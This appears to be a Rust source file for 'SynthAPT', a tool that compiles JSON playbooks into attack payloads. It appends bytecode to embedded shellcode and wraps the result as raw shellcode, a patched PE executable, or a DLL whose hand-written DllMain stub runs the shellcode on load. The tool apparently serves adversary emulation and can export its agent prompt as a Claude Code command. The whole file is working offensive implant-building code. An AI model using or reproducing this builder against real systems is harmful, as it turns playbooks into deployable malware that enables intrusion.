use clap::{Parser, Subcommand};

static EMBEDDED_SHELLCODE: &[u8] = include_bytes!("../../out/shellcode.bin");

// PE Constants (mirror of bak/generate_*.py)
const OFF_SIZE_OF_CODE: usize = 156;
const OFF_SIZE_OF_IMAGE: usize = 208;
const OFF_SECTION_VIRTUAL_SIZE: usize = 400;
const OFF_SECTION_RAW_SIZE: usize = 408;
const OFF_ENTRY_POINT: usize = 168;
const OFF_EXPORT_DIR: usize = 264;
const FILE_ALIGNMENT: usize = 0x200;
const SECTION_ALIGNMENT: usize = 0x1000;
const MAGIC_DEFAULT: u32 = 0x17171717;

#[derive(Parser)]
#[command(name = "synthapt", about = "SynthAPT playbook editor and compiler")]
pub struct Cli {
    #[command(subcommand)]
    pub command: Option<Command>,
}

#[derive(Subcommand)]
pub enum Command {
    /// Open the TUI editor with a playbook loaded from PATH
    Edit {
        /// Path to the playbook JSON file
        path: String,
    },
    /// Validate a playbook JSON file and print any errors
    Validate {
        /// Path to the playbook JSON file
        path: String,
    },
    /// Export the agent system prompt as a Claude Code slash command skill
    ExportSkill {
        /// Output path (default: .claude/commands/synthapt.md)
        output: Option<String>,
    },

    /// Compile a playbook to a payload
    Compile {
        /// Path to the playbook JSON file
        playbook: String,

        /// Output file path (default: payload.bin / payload.exe / payload.dll)
        output: Option<String>,

        /// Compile to PE EXE
        #[arg(short = 'e', long, conflicts_with = "dll")]
        exe: bool,

        /// Compile to PE DLL
        #[arg(short = 'd', long, conflicts_with = "exe")]
        dll: bool,

        /// Override the embedded base shellcode with a custom binary
        #[arg(short = 'b', long)]
        base: Option<String>,
    },
}

/// Validate a playbook JSON string and return a detailed report.
/// Returns Ok(summary) on success or Err(report) listing all issues found.
pub fn validate_playbook(json_str: &str) -> Result<String, String> {
    // Step 1: JSON syntax
    let root: serde_json::Value = match serde_json::from_str(json_str) {
        Ok(v) => v,
        Err(e) => return Err(format!("JSON syntax error: {}", e)),
    };

    // Step 2: Full schema parse
    match serde_json::from_str::<common::Playbook>(json_str) {
        Ok(pb) => {
            // Step 3: Compiler validation (catches required-field errors the schema can't)
            if let Err(compile_err) = common::compiler::compile(&root) {
                return Err(format!("compile error: {}", compile_err));
            }

            let mut lines = vec!["ok".to_string()];
            let mut sets: Vec<(&String, &Vec<common::Task>)> = pb.task_sets.iter().collect();
            sets.sort_by_key(|(k, _)| k.parse::<i64>().unwrap_or(i64::MAX));
            for (set_id, tasks) in &sets {
                lines.push(format!("  task_set {:?}: {} task(s)", set_id, tasks.len()));
                for (i, task) in tasks.iter().enumerate() {
                    let op = serde_json::to_value(task).ok()
                        .and_then(|v| v.get("op").and_then(|o| o.as_str()).map(|s| s.to_string()))
                        .unwrap_or_else(|| "?".to_string());
                    lines.push(format!("    [{}] {}", i, op));
                }
            }
            Ok(lines.join("\n"))
        }
        Err(top_err) => {
            // Drill into each task_set and task to collect all errors
            let mut errors = vec![format!("schema error: {}", top_err)];

            match root.get("task_sets") {
                None => errors.push("  missing required field 'task_sets'".to_string()),
                Some(v) if !v.is_object() => errors.push("  'task_sets' must be an object".to_string()),
                Some(v) => {
                    let task_sets = v.as_object().unwrap();
                    let mut set_keys: Vec<&String> = task_sets.keys().collect();
                    set_keys.sort_by_key(|k| k.parse::<i64>().unwrap_or(i64::MAX));

                    for set_id in set_keys {
                        let tasks_val = &task_sets[set_id];
                        if let Err(set_err) = serde_json::from_value::<Vec<common::Task>>(tasks_val.clone()) {
                            errors.push(format!("  task_set {:?}: {}", set_id, set_err));
                            // Drill into each task
                            if let Some(arr) = tasks_val.as_array() {
                                for (i, task_val) in arr.iter().enumerate() {
                                    if let Err(e) = serde_json::from_value::<common::Task>(task_val.clone()) {
                                        let op = task_val.get("op")
                                            .and_then(|v| v.as_str())
                                            .unwrap_or("<missing op>");
                                        errors.push(format!("    [{}] op={:?}: {}", i, op, e));
                                    }
                                }
                            } else {
                                errors.push(format!("  task_set {:?}: must be an array", set_id));
                            }
                        }
                    }
                }
            }

            Err(errors.join("\n"))
        }
    }
}

/// Find the base shellcode. Uses the binary embedded at build time unless a path is supplied.
pub fn find_base_shellcode(user_path: Option<&str>) -> Result<Vec<u8>, String> {
    if let Some(path) = user_path {
        return std::fs::read(path)
            .map_err(|e| format!("Failed to read base shellcode '{}': {}", path, e));
    }
    Ok(EMBEDDED_SHELLCODE.to_vec())
}

fn align_up(size: usize, alignment: usize) -> usize {
    (size + alignment - 1) & !(alignment - 1)
}

fn build_payload(sc_base: &[u8], bytecode: &[u8]) -> Vec<u8> {
    let mut payload = sc_base.to_vec();
    // Append magic (4 bytes LE)
    let magic = MAGIC_DEFAULT.to_le_bytes();
    payload.extend_from_slice(&magic);
    // Append task byte (0x00)
    payload.push(0x00);
    // Append bytecode
    payload.extend_from_slice(bytecode);
    payload
}

pub fn generate_shellcode_payload(shellcode: &[u8], bytecode: &[u8]) -> Vec<u8> {
    // Shellcode ends with [MAGIC: 4 bytes][TASK: 1 byte] — strip the last 5
    let sc_base = &shellcode[..shellcode.len().saturating_sub(5)];
    build_payload(sc_base, bytecode)
}

pub fn generate_exe(shellcode: &[u8], bytecode: &[u8]) -> Vec<u8> {
    use common::stubs::EXE_STUB;

    let payload = generate_shellcode_payload(shellcode, bytecode);
    let payload_size = payload.len();

    let raw_size = align_up(payload_size, FILE_ALIGNMENT);
    let virtual_size = align_up(payload_size, SECTION_ALIGNMENT);
    let size_of_image = 0x1000 + virtual_size;

    let mut exe = EXE_STUB.to_vec();

    // Patch header fields
    exe[OFF_SIZE_OF_CODE..OFF_SIZE_OF_CODE + 4].copy_from_slice(&(raw_size as u32).to_le_bytes());
    exe[OFF_SIZE_OF_IMAGE..OFF_SIZE_OF_IMAGE + 4].copy_from_slice(&(size_of_image as u32).to_le_bytes());
    exe[OFF_SECTION_VIRTUAL_SIZE..OFF_SECTION_VIRTUAL_SIZE + 4].copy_from_slice(&(payload_size as u32).to_le_bytes());
    exe[OFF_SECTION_RAW_SIZE..OFF_SECTION_RAW_SIZE + 4].copy_from_slice(&(raw_size as u32).to_le_bytes());

    // Append payload + padding
    exe.extend_from_slice(&payload);
    exe.extend(std::iter::repeat(0u8).take(raw_size - payload_size));

    exe
}

pub fn generate_dll(shellcode: &[u8], bytecode: &[u8]) -> Vec<u8> {
    use common::stubs::DLL_STUB;

    let payload = generate_shellcode_payload(shellcode, bytecode);

    // DllMain stub: check fdwReason == DLL_PROCESS_ATTACH (RDX), run shellcode on match
    // x64: RCX=hinstDLL, RDX=fdwReason, R8=lpvReserved
    let dllmain_stub: &[u8] = &[
        0x83, 0xFA, 0x01,             // cmp edx, 1
        0x74, 0x06,                   // je +6 (jump to shellcode)
        0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1 (return TRUE)
        0xC3,                         // ret
    ];

    let text_size = dllmain_stub.len() + payload.len();
    let raw_size = align_up(text_size, FILE_ALIGNMENT);
    let virtual_size = align_up(text_size, SECTION_ALIGNMENT);
    let size_of_image = 0x1000 + virtual_size;

    let mut dll = DLL_STUB.to_vec();

    // Clear export directory
    dll[OFF_EXPORT_DIR..OFF_EXPORT_DIR + 8].fill(0);

    // Entry point = DllMain at RVA 0x1000
    dll[OFF_ENTRY_POINT..OFF_ENTRY_POINT + 4].copy_from_slice(&(0x1000u32).to_le_bytes());

    // Patch sizes
    dll[OFF_SIZE_OF_CODE..OFF_SIZE_OF_CODE + 4].copy_from_slice(&(raw_size as u32).to_le_bytes());
    dll[OFF_SIZE_OF_IMAGE..OFF_SIZE_OF_IMAGE + 4].copy_from_slice(&(size_of_image as u32).to_le_bytes());
    dll[OFF_SECTION_VIRTUAL_SIZE..OFF_SECTION_VIRTUAL_SIZE + 4].copy_from_slice(&(text_size as u32).to_le_bytes());
    dll[OFF_SECTION_RAW_SIZE..OFF_SECTION_RAW_SIZE + 4].copy_from_slice(&(raw_size as u32).to_le_bytes());

    // Append DllMain stub + payload + padding
    dll.extend_from_slice(dllmain_stub);
    dll.extend_from_slice(&payload);
    dll.extend(std::iter::repeat(0u8).take(raw_size - text_size));

    dll
}

pub enum CompileMode {
    Shellcode,
    Exe,
    Dll,
}

pub fn run_compile(
    playbook_path: &str,
    output: Option<&str>,
    mode: CompileMode,
    base_shellcode_path: Option<&str>,
) -> Result<(), String> {
    // 1. Read and parse playbook
    let json_str = std::fs::read_to_string(playbook_path)
        .map_err(|e| format!("Failed to read playbook '{}': {}", playbook_path, e))?;
    let json_val: serde_json::Value = serde_json::from_str(&json_str)
        .map_err(|e| format!("Failed to parse playbook '{}': {}", playbook_path, e))?;

    // 2. Compile to bytecode
    let bytecode = common::compiler::compile(&json_val)
        .map_err(|e| format!("Compilation failed: {}", e))?;
    println!("Bytecode: {} bytes", bytecode.len());

    // 3. Determine output
    let default_ext = match mode {
        CompileMode::Shellcode => "payload.bin",
        CompileMode::Exe => "payload.exe",
        CompileMode::Dll => "payload.dll",
    };
    let out_path = output.unwrap_or(default_ext);

    match mode {
        CompileMode::Shellcode => {
            let shellcode = find_base_shellcode(base_shellcode_path)?;
            println!("Base shellcode: {} bytes", shellcode.len());
            let payload = generate_shellcode_payload(&shellcode, &bytecode);
            std::fs::write(out_path, &payload)
                .map_err(|e| format!("Failed to write '{}': {}", out_path, e))?;
            println!("Wrote {} bytes to {}", payload.len(), out_path);
        }
        CompileMode::Exe => {
            let shellcode = find_base_shellcode(base_shellcode_path)?;
            println!("Base shellcode: {} bytes", shellcode.len());
            let exe = generate_exe(&shellcode, &bytecode);
            std::fs::write(out_path, &exe)
                .map_err(|e| format!("Failed to write '{}': {}", out_path, e))?;
            println!("Wrote {} bytes to {}", exe.len(), out_path);
        }
        CompileMode::Dll => {
            let shellcode = find_base_shellcode(base_shellcode_path)?;
            println!("Base shellcode: {} bytes", shellcode.len());
            let dll = generate_dll(&shellcode, &bytecode);
            std::fs::write(out_path, &dll)
                .map_err(|e| format!("Failed to write '{}': {}", out_path, e))?;
            println!("Wrote {} bytes to {}", dll.len(), out_path);
        }
    }

    Ok(())
}
